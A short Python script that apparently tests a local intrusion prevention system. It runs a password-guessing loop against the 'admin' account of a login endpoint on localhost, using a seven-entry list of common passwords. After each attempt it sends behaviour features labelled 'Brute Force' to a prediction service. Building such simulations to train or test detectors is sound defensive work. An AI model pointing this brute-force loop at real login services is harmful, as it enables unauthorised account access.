import requests
import time

LOGIN_URL = "http://127.0.0.1:6000/login"
IPS_URL = "http://127.0.0.1:5000/predict"

# Wordlist (simulated attack)
password_list = [
    "123456", "admin", "password", "1234",
    "qwerty", "letmein", "password123"
]

ip = "192.168.1.50"

def run_attack():
    print("🚨 Starting REAL Brute Force Attack...\n")

    for attempt, pwd in enumerate(password_list, start=1):

        # Send login attempt
        response = requests.post(LOGIN_URL, json={
            "ip": ip,
            "username": "admin",
            "password": pwd
        })

        result = response.json()

        print(f"Attempt {attempt}: Password='{pwd}' → {result['status']}")

        # Send behavior to IPS
        ips_payload = {
            "ip": ip,
            "request_rate": 100,
            "failed_logins": result.get("failed_attempts", 0),
            "packet_size": 300,
            "duration": 1.0,
            "protocol": "TCP",
            "attack_type": "Brute Force"
        }

        requests.post(IPS_URL, json=ips_payload)

        time.sleep(0.5)

if __name__ == "__main__":
    run_attack()